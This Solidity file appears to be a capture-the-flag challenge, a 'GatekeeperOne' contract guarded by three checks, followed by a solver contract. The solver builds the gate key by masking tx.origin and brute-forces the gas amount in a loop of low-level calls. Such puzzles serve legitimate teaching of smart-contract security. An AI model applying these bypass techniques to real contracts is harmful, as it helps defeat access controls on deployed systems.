// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneOpener {
    function openGate(GatekeeperOne gate) external {
        bytes8 k = bytes8((uint64(uint160(tx.origin)) & 0x0000FFFF) | 0xFFFF00000000);

        bool ok = false;
        for (uint256 g = 8191 * 3; g < 8191 * 4; g++) {
            (ok,) = address(gate).call{gas: g}(abi.encodeWithSignature("enter(bytes8)", k));
            if (ok) {
                break;
            }
        }
        require(ok, "Must enter the gate");
    }
}
